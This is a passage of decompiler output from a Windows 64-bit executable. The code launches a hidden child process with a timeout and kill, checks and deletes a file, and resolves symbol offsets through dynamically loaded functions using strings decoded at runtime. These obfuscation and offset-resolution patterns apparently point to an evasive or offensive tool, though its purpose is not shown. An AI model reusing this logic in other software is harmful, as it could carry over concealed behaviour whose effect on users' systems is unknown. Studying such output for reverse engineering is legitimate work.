                                                                        (&stack0x00004d24 + lVar20))
                                                ;
                                                if (sVar25 == 0) {
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004365;
                                                  sVar25 = FUN_14000860f((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,*(ushort *)
                                                                           (&stack0x00004d26 +
                                                                           lVar20));
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004380;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d3c)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000439b;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d3d)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400043b6;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d3e)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400043d1;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d3f)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400043ec;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d20)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004407;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d21)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004422;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d22)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000443d;
                                                  sVar25 = FUN_1400085f8((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,(&stack0x00004d23)[lVar20]
                                                                        );
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004458;
                                                  sVar25 = FUN_140008576((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,*(uint *)(&stack0x00004cc4
                                                                                   + lVar20));
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1
                                                  ;
                                                  uVar32 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004478;
                                                  sVar25 = FUN_14000541c((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,0x140019adc,uVar32);
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000449a;
                                                  sVar25 = FUN_1400055ea((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,lVar55,(ulonglong)puVar50,
                                                                         0x140017320);
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  lVar33 = *(longlong *)(&stack0x00004cf0 + lVar20);
                                                  uVar32 = *(ulonglong *)(&stack0x00004d00 + lVar20)
                                                  ;
                                                  puVar50 = &DAT_140019a6d;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x6a;
                                                  uVar37 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400044c9;
                                                  uVar37 = FUN_14000ae64((longlong)
                                                                         (&stack0x00004140 + lVar20)
                                                                         ,0x140019a6d,uVar37);
                                                  *(undefined ***)(&stack0x00004ce8 + lVar20) =
                                                       &PTR_FUN_140017348;
                                                  *(undefined1 **)(&stack0x00004cf0 + lVar20) =
                                                       &stack0x00000030 + lVar20;
                                                  *(undefined8 *)(&stack0x00004cf8 + lVar20) = 0x400
                                                  ;
                                                  *(undefined8 *)(&stack0x00004d00 + lVar20) = 0;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400044f9;
                                                  sVar25 = FUN_1400055ea((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,uVar37,(ulonglong)puVar50,
                                                                         0x140017320);
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000450e;
                                                  lVar55 = FUN_1400053fc(*(longlong *)
                                                                          (&stack0x00004d10 + lVar20
                                                                          ));
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004527;
                                                  sVar25 = FUN_1400055ea((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,lVar55,uVar37,0x140017320)
                                                  ;
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 3
                                                  ;
                                                  uVar37 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004547;
                                                  sVar25 = FUN_14000541c((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,0x140019511,uVar37);
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004569;
                                                  sVar25 = FUN_1400055ea((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,lVar33,uVar32,0x140017320)
                                                  ;
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 2
                                                  ;
                                                  uVar32 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004589;
                                                  sVar25 = FUN_14000541c((undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                         ,0x14001950b,uVar32);
                                                  if (sVar25 != 0) goto LAB_140002cad;
                                                  uVar43 = *(undefined8 *)
                                                            (&stack0x00004cf0 + lVar20);
                                                  puVar2 = (undefined8 *)(&stack0x000043f0 + lVar20)
                                                  ;
                                                  *puVar2 = 0;
                                                  *(undefined8 *)(&stack0x000043f8 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004420 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004428 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004400 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004408 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004410 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004418 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004430 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004438 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004450 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004440 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004448 + lVar20) = 0;
                                                  *(undefined4 *)puVar2 = 0x68;
                                                  *(undefined4 *)(&stack0x0000442c + lVar20) = 1;
                                                  *(undefined8 *)(&stack0x00004c80 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004c88 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004c90 + lVar20) = 0;
                                                  *(undefined1 **)((longlong)auStackX_8 + lVar20) =
                                                       &stack0x00004c80 + lVar20;
                                                  *(undefined8 **)
                                                   ((longlong)auStackX_8 + lVar20 + -8) = puVar2;
                                                  *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20)
                                                       = 0;
                                                  *(undefined8 *)(&stack0xfffffffffffffff8 + lVar20)
                                                       = 0;
                                                  *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20)
                                                       = 0x8000000;
                                                  *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20)
                                                       = 0;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004605;
                                                  iVar29 = (*DAT_140034330)(0,uVar43,0);
                                                  if (iVar29 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004619;
                                                    CloseHandle(*(HANDLE *)
                                                                 (&stack0x00004c88 + lVar20));
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x14000462b;
                                                    iVar29 = (*DAT_140034338)(*(undefined8 *)
                                                                               (&stack0x00004c80 +
                                                                               lVar20));
                                                    if (iVar29 == 0x102) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 1;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004642;
                                                      (*DAT_140034340)(*(undefined8 *)
                                                                        (&stack0x00004c80 + lVar20))
                                                      ;
                                                    }
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x14000464e;
                                                    CloseHandle(*(HANDLE *)
                                                                 (&stack0x00004c80 + lVar20));
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x14000465a;
                                                    DVar26 = GetFileAttributesA(*(LPCSTR *)
                                                                                 (&stack0x00004d10 +
                                                                                 lVar20));
                                                    if (DVar26 != 0xffffffff) {
                                                      *(undefined8 *)
                                                       (&stack0xfffffffffffffff0 + lVar20) = 0;
                                                      *(undefined4 *)
                                                       (&stack0xffffffffffffffe8 + lVar20) = 0x80;
                                                      *(undefined4 *)
                                                       (&stack0xffffffffffffffe0 + lVar20) = 3;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 1;
                                                      uVar43 = *(undefined8 *)
                                                                ((longlong)&uStack_48 + lVar20);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004691;
                                                      pvVar35 = CreateFileA(*(LPCSTR *)
                                                                             (&stack0x00004d10 +
                                                                             lVar20),0x80000000,
                                                                            (DWORD)uVar43,
                                                                            (LPSECURITY_ATTRIBUTES)
                                                                            0x0,*(DWORD *)(&
                                                  stack0xffffffffffffffe0 + lVar20),
                                                  *(DWORD *)(&stack0xffffffffffffffe8 + lVar20),
                                                  *(HANDLE *)(&stack0xfffffffffffffff0 + lVar20));
                                                  if (pvVar35 != (HANDLE)0xffffffffffffffff) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400046a8;
                                                    DVar26 = GetFileSize(pvVar35,(LPDWORD)0x0);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400046b2;
                                                    CloseHandle(pvVar35);
                                                    if (0x3ff < DVar26) {
                                                      pCVar44 = *(LPCSTR *)
                                                                 (&stack0x00004d10 + lVar20);
                                                      goto LAB_140003a89;
                                                    }
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400046c6;
                                                    DeleteFileA(*(LPCSTR *)
                                                                 (&stack0x00004d10 + lVar20));
                                                  }
                                                  }
                                                  goto LAB_140002cad;
                                                  }
                                                  goto LAB_140004bd0;
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                      else {
LAB_140003a89:
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a8e
                                        ;
                                        pvVar35 = GetCurrentProcess();
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 6;
                                        uVar43 = *(undefined8 *)((longlong)&uStack_48 + lVar20);
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003a9a
                                        ;
                                        (*DAT_140034248)(uVar43);
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003aa8
                                        ;
                                        iVar29 = (*DAT_140034250)(pvVar35,0,0);
                                        if (iVar29 == 0) goto LAB_140002cad;
                                        *(undefined4 *)(&stack0xfffffffffffffff8 + lVar20) = 0;
                                        *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20) = 0;
                                        *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20) =
                                             0x1000000;
                                        *(undefined8 *)(&stack0xffffffffffffffe0 + lVar20) =
                                             0x10000000;
                                        *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x140003ae0
                                        ;
                                        uVar32 = (*DAT_140034258)(pvVar35,0,pCVar44,0);
                                        if (uVar32 != 0) {
                                          *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                               0x140003af1;
                                          pvVar42 = (void *)FUN_140008547();
                                          pcVar24 = DAT_140034278;
                                          if (pvVar42 != (void *)0x0) {
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) = 9;
                                            uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20);
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                 0x140003b1b;
                                            uVar43 = FUN_14000ae64(0x1400347a0,0x1400199d5,uVar37);
                                            *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                 0x140003b2a;
                                            iVar29 = (*pcVar24)(pvVar35,uVar32,uVar43,pvVar42);
                                            pcVar24 = DAT_140034278;
                                            if (iVar29 == 0) {
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0x10;
                                              uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20)
                                              ;
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                   0x140003b4c;
                                              uVar43 = FUN_14000ae64(0x1400347a0,0x1400199de,uVar37)
                                              ;
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                   0x140003b5b;
                                              iVar29 = (*pcVar24)(pvVar35,uVar32,uVar43,pvVar42);
                                              if (iVar29 != 0) goto LAB_140003b63;
                                            }
                                            else {
LAB_140003b63:
                                              uVar27 = *(uint *)((longlong)pvVar42 + 4);
                                              puVar50 = &DAT_1400199ee;
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) = 0xf;
                                              uVar37 = *(ulonglong *)((longlong)&uStack_48 + lVar20)
                                              ;
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                   0x140003b7e;
                                              lVar33 = FUN_14000ae64(0x1400347a0,0x1400199ee,uVar37)
                                              ;
                                              *(undefined8 **)(&stack0xffffffffffffffe8 + lVar20) =
                                                   &DAT_1400341e0;
                                              *(undefined **)(&stack0xffffffffffffffe0 + lVar20) =
                                                   puVar50;
                                              *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                   0x140003ba0;
                                              uVar37 = FUN_140008027(pvVar35,uVar32,
                                                                     (ulonglong)uVar27,lVar33,
                                                                     *(longlong *)
                                                                      (&stack0xffffffffffffffe0 +
                                                                      lVar20),*(ulonglong **)
                                                                               (&
                                                  stack0xffffffffffffffe8 + lVar20));
                                              if ((uVar37 & 1) != 0) {
                                                puVar50 = &DAT_1400199fd;
                                                *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                     0x12;
                                                uVar37 = *(ulonglong *)
                                                          ((longlong)&uStack_48 + lVar20);
                                                *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                     0x140003bbf;
                                                lVar33 = FUN_14000ae64(0x1400347a0,0x1400199fd,
                                                                       uVar37);
                                                *(undefined **)(&stack0xffffffffffffffe8 + lVar20) =
                                                     &DAT_1400341e8;
                                                *(undefined **)(&stack0xffffffffffffffe0 + lVar20) =
                                                     puVar50;
                                                *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                     0x140003be1;
                                                uVar37 = FUN_140008027(pvVar35,uVar32,
                                                                       (ulonglong)uVar27,lVar33,
                                                                       *(longlong *)
                                                                        (&stack0xffffffffffffffe0 +
                                                                        lVar20),*(ulonglong **)
                                                                                 (&
                                                  stack0xffffffffffffffe8 + lVar20));
                                                if ((uVar37 & 1) != 0) {
                                                  puVar50 = &DAT_140019a0f;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 5
                                                  ;
                                                  uVar37 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003c00;
                                                  lVar33 = FUN_14000ae64(0x1400347a0,0x140019a0f,
                                                                         uVar37);
                                                  *(undefined **)(&stack0xffffffffffffffe8 + lVar20)
                                                       = &DAT_1400341f0;
                                                  *(undefined **)(&stack0xffffffffffffffe0 + lVar20)
                                                       = puVar50;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003c22;
                                                  uVar37 = FUN_140008027(pvVar35,uVar32,
                                                                         (ulonglong)uVar27,lVar33,
                                                                         *(longlong *)
                                                                          (&stack0xffffffffffffffe0
                                                                          + lVar20),
                                                                         *(ulonglong **)
                                                                          (&stack0xffffffffffffffe8
                                                                          + lVar20));
                                                  if ((uVar37 & 1) != 0) {
                                                    puVar50 = &DAT_140019a14;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0xe;
                                                    uVar37 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003c41;
                                                    lVar33 = FUN_14000ae64(0x1400347a0,0x140019a14,
                                                                           uVar37);
                                                    *(longlong **)
                                                     (&stack0xffffffffffffffe8 + lVar20) =
                                                         &DAT_1400341f8;
                                                    *(undefined **)
                                                     (&stack0xffffffffffffffe0 + lVar20) = puVar50;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003c63;
                                                    uVar37 = FUN_140008027(pvVar35,uVar32,
                                                                           (ulonglong)uVar27,lVar33,
                                                                           *(longlong *)
                                                                            (&
                                                  stack0xffffffffffffffe0 + lVar20),
                                                  *(ulonglong **)(&stack0xffffffffffffffe8 + lVar20)
                                                  );
                                                  if ((uVar37 & 1) != 0) {
                                                    puVar50 = &DAT_140019a22;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x15;
                                                    uVar37 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003c82;
                                                    lVar33 = FUN_14000ae64(0x1400347a0,0x140019a22,
                                                                           uVar37);
                                                    *(longlong **)
                                                     (&stack0xffffffffffffffe8 + lVar20) =
                                                         &DAT_140034200;
                                                    *(undefined **)
                                                     (&stack0xffffffffffffffe0 + lVar20) = puVar50;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003ca4;
                                                    uVar37 = FUN_140008027(pvVar35,uVar32,
                                                                           (ulonglong)uVar27,lVar33,
                                                                           *(longlong *)
                                                                            (&
                                                  stack0xffffffffffffffe0 + lVar20),
                                                  *(ulonglong **)(&stack0xffffffffffffffe8 + lVar20)
                                                  );
                                                  if ((uVar37 & 1) != 0) {
                                                    puVar50 = &DAT_140019a37;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         10;
                                                    uVar37 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003cc3;
                                                    lVar33 = FUN_14000ae64(0x1400347a0,0x140019a37,
                                                                           uVar37);
                                                    *(longlong **)
                                                     (&stack0xffffffffffffffe8 + lVar20) =
                                                         &DAT_140034208;
                                                    *(undefined **)
                                                     (&stack0xffffffffffffffe0 + lVar20) = puVar50;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003ce5;
                                                    uVar32 = FUN_140008027(pvVar35,uVar32,
                                                                           (ulonglong)uVar27,lVar33,
                                                                           *(longlong *)
                                                                            (&
                                                  stack0xffffffffffffffe0 + lVar20),
                                                  *(ulonglong **)(&stack0xffffffffffffffe8 + lVar20)
                                                  );
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003cf0;
                                                  free(pvVar42);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003cfc;
                                                  (*DAT_140034268)(pvVar35);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003d05;
                                                  (*DAT_140034260)(pvVar35);
                                                  if ((uVar32 & 1) == 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003d14;
                                                  pvVar35 = GetCurrentProcess();
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 6
                                                  ;
                                                  uVar43 = *(undefined8 *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003d20;
                                                  (*DAT_140034248)(uVar43);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003d2e;
                                                  iVar29 = (*DAT_140034250)(pvVar35,0,0);
                                                  if (iVar29 != 0) {
                                                    *(undefined4 *)
                                                     (&stack0xfffffffffffffff8 + lVar20) = 0;
                                                    *(undefined8 *)
                                                     (&stack0xfffffffffffffff0 + lVar20) = 0;
                                                    *(undefined4 *)
                                                     (&stack0xffffffffffffffe8 + lVar20) = 0x1000000
                                                    ;
                                                    *(undefined8 *)
                                                     (&stack0xffffffffffffffe0 + lVar20) =
                                                         0x10000000;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003d63;
                                                    uVar32 = (*DAT_140034258)(pvVar35,0,pCVar44);
                                                    if (uVar32 != 0) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140003d74;
                                                      pvVar42 = (void *)FUN_140008547();
                                                      pcVar24 = DAT_140034280;
                                                      if (pvVar42 != (void *)0x0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0x1d;
                                                        uVar37 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003d9e;
                                                        uVar43 = FUN_14000ae64(0x1400347a0,
                                                                               0x140019942,uVar37);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003daa;
                                                        iVar29 = (*pcVar24)(pvVar35,uVar43,pvVar42);
                                                        pcVar24 = DAT_140034280;
                                                        if (iVar29 != 0) {
                                                          DAT_140034210 =
                                                               *(longlong *)
                                                                ((longlong)pvVar42 + 0x38) - uVar32;
                                                        }
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0x1c;
                                                        uVar37 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003dda;
                                                        uVar43 = FUN_14000ae64(0x1400347a0,
                                                                               0x14001995f,uVar37);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003de6;
                                                        iVar29 = (*pcVar24)(pvVar35,uVar43,pvVar42);
                                                        pcVar24 = DAT_140034280;
                                                        if (iVar29 != 0) {
                                                          DAT_140034218 =
                                                               *(longlong *)
                                                                ((longlong)pvVar42 + 0x38) - uVar32;
                                                        }
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0x19;
                                                        uVar37 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003e16;
                                                        uVar43 = FUN_14000ae64(0x1400347a0,
                                                                               0x14001997b,uVar37);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003e22;
                                                        iVar29 = (*pcVar24)(pvVar35,uVar43,pvVar42);
                                                        pcVar24 = DAT_140034280;
                                                        if (iVar29 != 0) {
                                                          DAT_140034220 =
                                                               *(longlong *)
                                                                ((longlong)pvVar42 + 0x38) - uVar32;
                                                        }
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0x10;
                                                        uVar37 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003e52;
                                                        uVar43 = FUN_14000ae64(0x1400347a0,
                                                                               0x140019994,uVar37);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003e5e;
                                                        iVar29 = (*pcVar24)(pvVar35,uVar43,pvVar42);
                                                        pcVar24 = DAT_140034280;
                                                        if (iVar29 != 0) {
                                                          DAT_140034228 =
                                                               *(longlong *)
                                                                ((longlong)pvVar42 + 0x38) - uVar32;
                                                        }
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0xd;
                                                        uVar37 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003e8e;
                                                        uVar43 = FUN_14000ae64(0x1400347a0,
                                                                               0x1400199a4,uVar37);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003e9a;
                                                        iVar29 = (*pcVar24)(pvVar35,uVar43,pvVar42);
                                                        pcVar24 = DAT_140034280;
                                                        if (iVar29 != 0) {
                                                          DAT_140034230 =
                                                               *(longlong *)
                                                                ((longlong)pvVar42 + 0x38) - uVar32;
                                                        }
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0xc;
                                                        uVar37 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003eca;
                                                        uVar43 = FUN_14000ae64(0x1400347a0,
                                                                               0x1400199b1,uVar37);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003ed6;
                                                        iVar29 = (*pcVar24)(pvVar35,uVar43,pvVar42);
                                                        if (iVar29 != 0) {
                                                          DAT_140034238 =
                                                               *(longlong *)
                                                                ((longlong)pvVar42 + 0x38) - uVar32;
                                                        }
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140003eed;
                                                        _Memory = (void *)FUN_140008547();
                                                        pcVar24 = DAT_140034278;
                                                        if (_Memory != (void *)0x0) {
                                                          *(undefined8 *)
                                                           ((longlong)&uStack_48 + lVar20) = 0xc;
                                                          uVar37 = *(ulonglong *)
                                                                    ((longlong)&uStack_48 + lVar20);
                                                          *(undefined8 *)
                                                           ((longlong)&uStack_48 + lVar20) =
                                                               0x140003f17;
                                                          uVar43 = FUN_14000ae64(0x1400347a0,
                                                                                 0x1400199bd,uVar37)
                                                          ;
                                                          *(undefined8 *)
                                                           ((longlong)&uStack_48 + lVar20) =
                                                               0x140003f26;
                                                          iVar29 = (*pcVar24)(pvVar35,uVar32,uVar43)
                                                          ;
                                                          if (iVar29 != 0) {
                                                            *(undefined8 *)
                                                             (&stack0x00000030 + lVar20) = 0;
                                                            uVar27 = *(uint *)((longlong)_Memory + 4
                                                                              );
                                                            puVar50 = &DAT_1400199c9;
                                                            *(undefined8 *)
                                                             ((longlong)&uStack_48 + lVar20) = 0xc;
                                                            uVar37 = *(ulonglong *)
                                                                      ((longlong)&uStack_48 + lVar20
                                                                      );
                                                            *(undefined8 *)
                                                             ((longlong)&uStack_48 + lVar20) =
                                                                 0x140003f4a;
                                                            lVar33 = FUN_14000ae64(0x1400347a0,
                                                                                   0x1400199c9,
                                                                                   uVar37);
                                                            *(undefined1 **)
                                                             (&stack0xffffffffffffffe8 + lVar20) =
                                                                 &stack0x00000030 + lVar20;
                                                            *(undefined **)
                                                             (&stack0xffffffffffffffe0 + lVar20) =
                                                                 puVar50;
                                                            *(undefined8 *)
                                                             ((longlong)&uStack_48 + lVar20) =
                                                                 0x140003f69;
                                                            uVar37 = FUN_140008027(pvVar35,uVar32,
                                                                                   (ulonglong)uVar27
                                                                                   ,lVar33,*(
                                                  longlong *)(&stack0xffffffffffffffe0 + lVar20),
                                                  *(ulonglong **)(&stack0xffffffffffffffe8 + lVar20)
                                                  );
                                                  if ((uVar37 & 1) != 0) {
                                                    _DAT_140034240 =
                                                         *(undefined8 *)(&stack0x00000030 + lVar20);
                                                  }
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003f80;
                                                  free(_Memory);
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003f88;
                                                  free(pvVar42);
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003f94;
                                                  (*DAT_140034268)(pvVar35,uVar32);
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003f9d;
                                                  (*DAT_140034260)(pvVar35);
                                                  }
                                                  if (((&stack0x00004d30)[lVar20] & 1) == 0) {
LAB_140004e75:
